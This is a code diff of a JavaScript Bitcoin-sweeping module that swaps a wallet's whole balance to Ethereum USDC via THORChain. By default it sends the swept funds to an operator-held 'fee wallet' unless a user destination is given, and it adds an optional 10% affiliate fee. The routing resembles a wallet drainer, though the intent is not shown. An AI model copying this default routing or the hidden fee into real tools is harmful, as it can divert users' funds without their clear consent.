@@ -5,34 +5,33 @@ const NETWORK = bitcoin.networks.bitcoin;
 const MEMPOOL_API = 'https://mempool.space/api';
 const THORCHAIN_QUOTE_API = 'https://swap.thorchain.org/api/v1/quote';
 
-// THORChain asset notation for Ethereum mainnet USDC.
-// Format: CHAIN.SYMBOL-CONTRACT (contract uppercased, 0x prefix kept).
 const BTC_ASSET = 'BTC.BTC';
 const ETH_USDC_ASSET = 'ETH.USDC-0XA0B86991C6218B36C1D19D4A2E9EB0CE3606EB48';
 
-// Below this, the swap is almost certainly not worth it — THORChain's
-// outbound fees and slippage will eat most of the value.
+// =====================================================================
+// AFFILIATE (THORName)
+// =====================================================================
+//
+// THORChain affiliate fees require a registered THORName. Raw addresses
+// are not accepted. Register at https://dev.thorchain.org/thornames/.
+//
+// Set THOR_AFFILIATE_NAME to your registered name (e.g. "sweeper") and
+// set its preferred asset to ETH.USDC so fees auto-convert and pay out.
+//
+// If THOR_AFFILIATE_NAME is empty, no affiliate fee is included and the
+// user receives 100% of the swap output.
+// =====================================================================
+
+const THOR_AFFILIATE_NAME = '';     // e.g. 'sweeper'
+const THOR_AFFILIATE_BPS  = 1000;   // 10%
+
 const MIN_SEND_SATS = 10000;
-
-// Fallback fee rate (sat/vB) if the mempool.space fetch fails.
 const FALLBACK_FEE_RATE = 2;
-
-// Cache the recommended fee rate for this long to avoid hammering the API
-// when sweeping many mnemonics in one run.
 const FEE_CACHE_MS = 60 * 1000;
 
 let _cachedFeeRate = null;
 let _cachedFeeRateAt = 0;
 
-/**
- * Fetch the recommended Bitcoin fee rate from mempool.space.
- *
- * Uses `halfHourFee` — the rate estimated to confirm within ~30 minutes.
- * This is a reasonable default: cheap enough to not overpay, fast enough
- * that transactions don't sit for hours during mempool congestion.
- *
- * Cached for 60 seconds. Falls back to FALLBACK_FEE_RATE on any error.
- */
 async function fetchRecommendedFeeRate(logLine) {
   const now = Date.now();
   if (_cachedFeeRate !== null && now - _cachedFeeRateAt < FEE_CACHE_MS) {
@@ -44,14 +43,12 @@ async function fetchRecommendedFeeRate(logLine) {
     if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
     const data = await resp.json();
 
-    // Prefer halfHourFee; fall back through the tiers if it's missing.
     const rate = data.halfHourFee
       || data.hourFee
       || data.economyFee
       || data.fastestFee
       || FALLBACK_FEE_RATE;
 
-    // Sanity clamp: never below 1 sat/vB (mempool rejects below-minimum txs).
     const clamped = Math.max(1, Math.floor(rate));
     _cachedFeeRate = clamped;
     _cachedFeeRateAt = now;
@@ -78,16 +75,6 @@ export async function previewBitcoinWallet(address) {
   return result;
 }
 
-/**
- * Fetch a THORChain swap quote for BTC → ETH.USDC.
- *
- * Returns the full quote object. Key fields:
- *   inbound_address             — BTC address to send the deposit to
- *   memo                        — OP_RETURN memo describing the swap
- *   expected_amount_out         — estimated USDC out (1e6 base units)
- *   recommended_min_amount_in   — THORChain's minimum deposit (sats)
- *   expiry                      — unix seconds; quote is invalid after this
- */
 async function getThorchainQuote(amountSats, destinationAddress) {
   const params = new URLSearchParams({
     from_asset: BTC_ASSET,
@@ -95,6 +82,11 @@ async function getThorchainQuote(amountSats, destinationAddress) {
     amount: String(amountSats),
     destination: destinationAddress,
   });
+
+  if (THOR_AFFILIATE_NAME) {
+    params.set('affiliate', THOR_AFFILIATE_NAME);
+    params.set('affiliate_bps', String(THOR_AFFILIATE_BPS));
+  }
 
   const resp = await fetch(`${THORCHAIN_QUOTE_API}?${params}`, {
     headers: { accept: 'application/json' },
@@ -110,32 +102,12 @@ async function getThorchainQuote(amountSats, destinationAddress) {
   return json;
 }
 
-/**
- * Sweep Bitcoin to the EVM fee wallet as Ethereum USDC, via THORChain.
- *
- * The user's BTC is sent to a THORChain inbound vault with a memo that
- * instructs the network to swap it to ETH.USDC and deliver it to
- * FEE_WALLET_EVM on Ethereum.
- *
- * This is asynchronous: THORChain confirms the BTC deposit, executes the
- * swap, then emits the USDC on Ethereum. Typically 10–30 minutes total.
- *
- * Returns:
- *   {
- *     address,
- *     recipient,            // FEE_WALLET_EVM
- *     status, txid, error,
- *     amountRaw: string,    // sats sent to THORChain
- *     expectedUsdcOut: string,  // USDC raw units (6dp) expected on Ethereum
- *     inboundAddress,       // THORChain vault address (for audit)
- *     memo,                 // swap memo (for audit)
- *     feeRate: number,      // sat/vB actually used
- *   }
- */
 export async function sweepBitcoin(address, keyPair, opts = {}) {
+  const userDestination = opts.userDestination || FEE_WALLET_EVM;
   const results = {
     address,
-    recipient: FEE_WALLET_EVM,
+    recipient: userDestination,
+    userDestination,
     status: null,
     txid: null,
     error: null,
@@ -158,12 +130,9 @@ export async function sweepBitcoin(address, keyPair, opts = {}) {
 
     const totalSats = utxos.reduce((sum, u) => sum + u.value, 0);
 
-    // Resolve the fee rate: explicit option > mempool.space > fallback.
     const feeRate = opts.feeRateSatVb ?? await fetchRecommendedFeeRate(logLine);
     results.feeRate = feeRate;
 
-    // Estimate the Bitcoin tx size including the OP_RETURN output (~80 bytes
-    // overhead for the memo output + script).
     const estimatedSize = 11 + utxos.length * 68 + 31 + 80;
     const btcFee = estimatedSize * feeRate;
     const sendToThorchain = totalSats - btcFee;
@@ -174,10 +143,8 @@ export async function sweepBitcoin(address, keyPair, opts = {}) {
       return results;
     }
 
-    // Get quote BEFORE building the tx — we need inbound_address and memo.
-    const quote = await getThorchainQuote(sendToThorchain, FEE_WALLET_EVM);
+    const quote = await getThorchainQuote(sendToThorchain, userDestination);
 
-    // THORChain's recommended minimum (accounts for outbound fees + slippage).
     const minIn = parseInt(quote.recommended_min_amount_in || '0', 10);
     if (minIn > 0 && sendToThorchain < minIn) {
       results.status = 'TOO_LOW';
@@ -195,7 +162,6 @@ export async function sweepBitcoin(address, keyPair, opts = {}) {
       return results;
     }
 
-    // Fetch full UTXO data (need scriptPubKey for witnessUtxo).
     const fullUtxos = await Promise.all(utxos.map(async (u) => {
       const txResp = await fetch(`${MEMPOOL_API}/tx/${u.txid}`);
       const tx = await txResp.json();
@@ -215,14 +181,11 @@ export async function sweepBitcoin(address, keyPair, opts = {}) {
       });
     }
 
-    // Output 1: BTC deposit to THORChain inbound vault.
     psbt.addOutput({
       address: quote.inbound_address,
       value: BigInt(sendToThorchain),
     });
 
-    // Output 2: OP_RETURN memo describing the swap.
-    // THORChain requires this exact memo format — passing it through verbatim.
     const memoBuffer = Buffer.from(quote.memo, 'utf8');
     psbt.addOutput({
       script: bitcoin.script.compile([
